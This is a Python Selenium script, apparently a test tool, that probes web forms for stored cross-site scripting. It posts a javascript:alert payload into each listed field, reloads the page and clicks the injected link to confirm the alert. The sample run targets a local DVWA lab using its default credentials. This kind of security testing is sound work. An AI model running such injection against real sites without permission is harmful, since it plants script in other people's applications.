import os
import time
import random
import string
from pathlib import Path
from urllib.parse import urlparse, urljoin, urlencode
from selenium.webdriver.remote.webdriver import WebDriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import (
    TimeoutException,
    NoAlertPresentException,
    NoSuchElementException,
    WebDriverException,
    ElementClickInterceptedException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- Configuration ---
TARGET_FIELDS_FILENAME = "target_fields.txt"
ALERT_WAIT_TIMEOUT = 3
CLICK_WAIT_TIMEOUT = 5
POST_REQUEST_DELAY = 1.5 # Slightly increase delay after POST might be needed
POST_ACCEPT_SLEEP = 0.5
RELOAD_WAIT = 2 # Time to wait after reload before searching

# Giá trị mặc định
DEFAULT_VALUES = {
    "email": "test@example.com",
    "website": "https://example.com",
    "name": "Test User",
    "comment": "Default comment.",
    "message": "Default message",
}
DEFAULT_GENERIC = ""

def generate_random_string(length=12):
    """Tạo một chuỗi ngẫu nhiên gồm chữ và số."""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))

# Helper function to fill form data (reusable logic)
def build_post_data(all_fields_data, target_field_for_injection, payload, default_values):
    """Builds the POST data dictionary for injecting into a single field."""
    post_data = {}
    print(f"  Building POST data, injecting payload into: '{target_field_for_injection}'")
    for field_name, initial_value in all_fields_data.items():
        if field_name == target_field_for_injection: # Inject payload here
            post_data[field_name] = payload
            print(f"    Injecting payload into target field '{field_name}': '{payload}'")
        elif initial_value: # Use initial value if available for other fields
            post_data[field_name] = initial_value
            # print(f"    Using initial value for non-target field '{field_name}': '{initial_value}'") # Less verbose
        else: # Use default value for other fields if initial is empty
            default_val = default_values.get(field_name.lower(), DEFAULT_GENERIC) # Case-insensitive
            if not default_val: # Try generic matching
                if 'email' in field_name.lower(): default_val = default_values['email']
                elif 'name' in field_name.lower(): default_val = default_values['name']
                elif 'website' in field_name.lower() or 'url' in field_name.lower(): default_val = default_values['website']
                elif 'comment' in field_name.lower(): default_val = default_values['comment']
                elif 'message' in field_name.lower(): default_val = default_values['message']
            post_data[field_name] = default_val
            # print(f"    Using default value for non-target field '{field_name}': '{default_val}'") # Less verbose
    return post_data

def run_test(driver: WebDriver, target_url: str):
    """
    Kiểm tra Stored XSS bằng cách submit form nhiều lần, mỗi lần inject payload
    vào MỘT trường mục tiêu riêng biệt.
    """
    print(f"--- Running test: Stored XSS via Individual POSTs (javascript:alert) on {target_url} ---")

    script_dir = Path(__file__).parent.resolve()
    target_fields_path = script_dir / TARGET_FIELDS_FILENAME

    # 1. Đọc danh sách trường mục tiêu
    try:
        with open(target_fields_path, 'r') as f:
            target_fields_to_inject = {line.strip() for line in f if line.strip()}
        if not target_fields_to_inject:
            print(f"Warning: Target fields file '{target_fields_path}' is empty or contains only whitespace.")
            target_fields_to_inject = set() # Proceed but test nothing
        print(f"Target fields to test individually: {target_fields_to_inject}")
    except FileNotFoundError:
        return False, f"Target fields file not found at '{target_fields_path}'"
    except Exception as e:
        return False, f"Error reading target fields file: {e}"

    initial_form_data = {}
    form_action_url = ""
    overall_vulnerability_found = False
    results_summary = [] # Store results for each field

    try:
        # 2. Truy cập URL và tìm form POST (làm một lần)
        print(f"Navigating to {target_url} to find form and initial data...")
        driver.get(target_url)
        time.sleep(1) # Chờ trang tải cơ bản

        try:
            form_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "form[method='POST']"))
            )
            print("Found POST form.")
            action_path = form_element.get_attribute("action") or ""
            form_action_url = urljoin(target_url, action_path)
            print(f"Form action URL: {form_action_url}")
        except (NoSuchElementException, TimeoutException):
            return False, "No POST form found on the page within timeout. Cannot proceed."

        # 3. Trích xuất tất cả trường và giá trị ban đầu (làm một lần)
        print("Extracting initial form fields and values...")
        fields = form_element.find_elements(By.XPATH, ".//input | .//textarea | .//select")
        for field in fields:
            field_name = field.get_attribute("name")
            if field_name:
                field_value = field.get_attribute("value")
                if field.tag_name == "textarea" and not field_value:
                    field_value = field.get_attribute('textContent')
                elif field.tag_name == "select":
                    try:
                        selected_option = field.find_element(By.XPATH, ".//option[@selected]")
                        field_value = selected_option.get_attribute("value")
                    except NoSuchElementException:
                        try:
                            first_option = field.find_element(By.TAG_NAME, "option")
                            field_value = first_option.get_attribute("value")
                        except NoSuchElementException: field_value = ""
                initial_form_data[field_name] = field_value if field_value is not None else ""
                print(f"  Found field: name='{field_name}', initial_value='{initial_form_data[field_name]}'")

        if not initial_form_data:
             return False, "No fields with 'name' attribute found in the form. Cannot proceed."
        if not target_fields_to_inject:
             return False, "No target fields specified to test." # Added check


        # --- Loop Start: Test each target field individually ---
        for field_to_test in target_fields_to_inject:
            print(f"\n--- Testing Field: '{field_to_test}' ---")

            if field_to_test not in initial_form_data:
                print(f"WARNING: Target field '{field_to_test}' not found in the extracted form fields. Skipping.")
                results_summary.append(f"Field '{field_to_test}': SKIPPED (Not found in form)")
                continue # Skip to the next field

            # Generate unique payload for this field test
            random_string = generate_random_string()
            javascript_payload = f"javascript:alert('{random_string}')"
            print(f"Generated payload for this field: {javascript_payload}")

            # 4. Build POST data for this specific field injection
            post_data = build_post_data(initial_form_data, field_to_test, javascript_payload, DEFAULT_VALUES)

            # Mã hóa và escape
            encoded_post_data = urlencode(post_data)
            escaped_post_data = encoded_post_data.replace('\\', '\\\\').replace("'", "\\'")
            # print(f"Encoded POST data (first 200 chars): {encoded_post_data[:200]}...") # Can be verbose

            # 5. Thực hiện POST bằng JavaScript fetch
            js_fetch_script = f"""
            fetch('{form_action_url}', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                body: '{escaped_post_data}'
            }})
            .then(response => {{
                console.log('Fetch response status for {field_to_test}:', response.status);
                // Không cần chuyển hướng ở đây, sẽ reload trang gốc sau
                return response.text();
            }})
            .then(data => console.log('Fetch response data for {field_to_test} (first 100 chars):', String(data).substring(0, 100)))
            .catch(error => console.error('Fetch error for {field_to_test}:', error));
            return null;
            """
            print(f"Executing fetch POST request for field '{field_to_test}'...")
            try:
                driver.execute_script(js_fetch_script)
                print(f"Waiting {POST_REQUEST_DELAY}s after POST for '{field_to_test}'...")
                time.sleep(POST_REQUEST_DELAY)
            except WebDriverException as post_err:
                print(f"ERROR: WebDriverException during fetch POST for '{field_to_test}': {post_err}")
                results_summary.append(f"Field '{field_to_test}': FAILED (POST Error)")
                continue # Skip to next field

            # 6. Tải lại trang gốc để xem kết quả stored
            print(f"Reloading original page to check for stored payload from '{field_to_test}': {target_url}")
            driver.get(target_url)
            print(f"Waiting {RELOAD_WAIT}s for page elements and potential injected link...")
            time.sleep(RELOAD_WAIT)

            # 7. Tìm phần tử <a> chứa payload và click vào nó
            field_vulnerable = False
            link_found_for_field = False
            alert_triggered_correctly = False
            alert_text_received = ""

            link_xpath = f"//a[contains(@href, \"javascript:alert\") and contains(@href, \"{random_string}\")]"

            try:
                print(f"Searching for injected link for '{field_to_test}' with XPath: {link_xpath}")
                injected_link = WebDriverWait(driver, CLICK_WAIT_TIMEOUT).until(
                    EC.presence_of_element_located((By.XPATH, link_xpath))
                )
                print(f"SUCCESS: Found injected link for '{field_to_test}': {injected_link.get_attribute('outerHTML')[:100]}...")
                link_found_for_field = True

                print(f"Attempting to click the injected link for '{field_to_test}'...")
                try:
                    driver.execute_script("arguments[0].scrollIntoView(true);", injected_link)
                    time.sleep(0.5)
                    injected_link.click()
                    print("Link clicked. Now checking for alert...")

                    # 8. Kiểm tra Alert sau khi click
                    try:
                        WebDriverWait(driver, ALERT_WAIT_TIMEOUT).until(EC.alert_is_present())
                        alert = driver.switch_to.alert
                        alert_text_received = alert.text
                        print(f"Alert detected for '{field_to_test}' with text: '{alert_text_received}'")

                        if alert_text_received == random_string:
                            print(f"SUCCESS: Alert text for '{field_to_test}' matches the expected random string!")
                            field_vulnerable = True
                            alert_triggered_correctly = True
                            overall_vulnerability_found = True # Mark overall success
                        else:
                            print(f"WARNING: Alert text for '{field_to_test}' ('{alert_text_received}') does NOT match expected ('{random_string}').")

                        print("Accepting alert...")
                        alert.accept()
                        time.sleep(POST_ACCEPT_SLEEP)
                        print("Alert accepted.")

                    except TimeoutException:
                        print(f"FAILURE: Clicked the link for '{field_to_test}', but NO alert appeared.")
                    except NoAlertPresentException:
                         print(f"FAILURE: Alert check failed unexpectedly for '{field_to_test}' (NoAlertPresentException).")
                    except Exception as alert_err:
                        print(f"ERROR: An error occurred during alert handling for '{field_to_test}': {alert_err}")

                except ElementClickInterceptedException:
                     print(f"FAILURE: Could not click the link for '{field_to_test}' - obscured.")
                except WebDriverException as click_err:
                     print(f"FAILURE: WebDriver error during click attempt for '{field_to_test}': {click_err}")
                except Exception as click_err:
                     print(f"FAILURE: Unexpected error during click attempt for '{field_to_test}': {click_err}")

            except TimeoutException:
                print(f"INFO: Did not find link matching payload for '{field_to_test}' within {CLICK_WAIT_TIMEOUT}s.")
            except NoSuchElementException:
                 print(f"INFO: No link element found matching payload for '{field_to_test}'.") # Should be caught by Timeout
            except Exception as find_err:
                print(f"ERROR: An unexpected error occurred searching for link for '{field_to_test}': {find_err}")

            # Record result for this field
            if field_vulnerable:
                results_summary.append(f"Field '{field_to_test}': VULNERABLE (Alert '{random_string}' confirmed)")
            elif link_found_for_field and not alert_triggered_correctly:
                 results_summary.append(f"Field '{field_to_test}': POTENTIAL/FAILED (Link found, clicked, but alert incorrect/missing. Received: '{alert_text_received}')")
            elif not link_found_for_field:
                 results_summary.append(f"Field '{field_to_test}': NOT VULNERABLE (Link not found)")
            else:
                 results_summary.append(f"Field '{field_to_test}': INCONCLUSIVE")

            # Optional: Clean up state slightly? Reloading already does a lot.
            # If the alert wasn't dismissed due to an error, try again.
            try:
                alert = driver.switch_to.alert
                print("Attempting to dismiss lingering alert before next field test...")
                alert.accept()
            except NoAlertPresentException:
                pass

        # --- Loop End ---

    except WebDriverException as e:
        print(f"CRITICAL: A WebDriver error occurred during setup or testing: {e}")
        try:
            driver.switch_to.alert.accept()
        except NoAlertPresentException: pass
        return False, f"WebDriver error: {e}. Partial results: {'; '.join(results_summary)}"
    except Exception as e:
        print(f"CRITICAL: An unexpected error occurred: {e}")
        return False, f"An unexpected error occurred: {e}. Partial results: {'; '.join(results_summary)}"

    # 9. Báo cáo kết quả cuối cùng
    print("\n--- Individual Field Test Summary ---")
    for result in results_summary:
        print(f"- {result}")
    print("-------------------------------------")

    final_message = f"Individual field testing complete. Vulnerabilities found: {overall_vulnerability_found}. Summary: {'; '.join(results_summary)}"
    return overall_vulnerability_found, final_message

# --- Phần chạy thử nghiệm (ví dụ) ---
if __name__ == '__main__':
    # Khởi tạo WebDriver (ví dụ với Chrome)
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service as ChromeService
    from webdriver_manager.chrome import ChromeDriverManager

    chrome_options = webdriver.ChromeOptions()
    # chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920x1080")

    driver = None # Initialize driver to None
    try:
        service = ChromeService(executable_path=ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        print("WebDriver initialized successfully.")

        # URL mục tiêu (thay thế bằng URL của bạn)
        test_url = "http://localhost/dvwa/vulnerabilities/xss_s/" # Ví dụ DVWA

        # --- Đăng nhập nếu cần (Ví dụ cho DVWA) ---
        try:
            print("Attempting to log into DVWA (example)...")
            driver.get("http://localhost/dvwa/login.php")
            time.sleep(1)

            # Tùy chọn: Đặt mức độ bảo mật Low nếu cần
            # print("Attempting to set security level to Low...")
            # driver.get("http://localhost/dvwa/security.php")
            # time.sleep(0.5)
            # security_dropdown = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "security")))
            # from selenium.webdriver.support.ui import Select
            # select = Select(security_dropdown)
            # current_level = select.first_selected_option.get_attribute("value")
            # if current_level != "low":
            #     select.select_by_value("low")
            #     submit_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.NAME, "seclev_submit")))
            #     submit_button.click()
            #     print("Set security level to low.")
            #     time.sleep(1) # Wait for redirect
            # else:
            #     print("Security level already low.")
            # driver.get("http://localhost/dvwa/login.php") # Quay lại login
            # time.sleep(1)


            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "username"))).send_keys("admin")
            driver.find_element(By.NAME, "password").send_keys("password")
            driver.find_element(By.CSS_SELECTOR, "input[type='submit']").click()
            time.sleep(1)
            if "index.php" in driver.current_url:
                 print("Login successful (assumed).")
            else:
                 print("Login might have failed.")
                 # Consider exiting if login fails
                 # driver.quit()
                 # exit()
        except Exception as login_err:
            print(f"Could not perform login steps: {login_err}")
            # Consider exiting if login fails
            # if driver: driver.quit()
            # exit()
        # --- Kết thúc phần đăng nhập ---

        # Tạo file target_fields.txt nếu chưa có (ví dụ cho DVWA Stored XSS)
        if not os.path.exists(TARGET_FIELDS_FILENAME):
            print(f"Creating example '{TARGET_FIELDS_FILENAME}' for DVWA Stored XSS...")
            with open(TARGET_FIELDS_FILENAME, 'w') as f:
                f.write("txtName\n") # Trường tên trong DVWA
                f.write("mtxMessage\n") # Trường message trong DVWA
                # f.write("nonExistentField\n") # Thêm field không tồn tại để test skipping
            print("Example file created.")

        # Chạy kiểm thử mới
        # success, message = run_test(driver, test_url) # Chạy hàm cũ (nếu bạn muốn giữ nó lại và đổi tên)
        success, message = run_test(driver, test_url) # Chạy hàm mới


        print("\n==========================")
        print(f" Overall Test Result: {'VULNERABILITY DETECTED' if success else 'NO VULNERABILITY DETECTED (or errors occurred)'}")
        print(f" Final Summary: {message}")
        print("==========================")

    except Exception as main_err:
        print(f"\nCRITICAL ERROR in main execution: {main_err}")
    finally:
        # Đảm bảo đóng trình duyệt
        if driver:
            print("Closing WebDriver...")
            try:
                driver.quit()
                print("WebDriver closed.")
            except Exception as quit_err:
                print(f"Error trying to quit WebDriver: {quit_err}")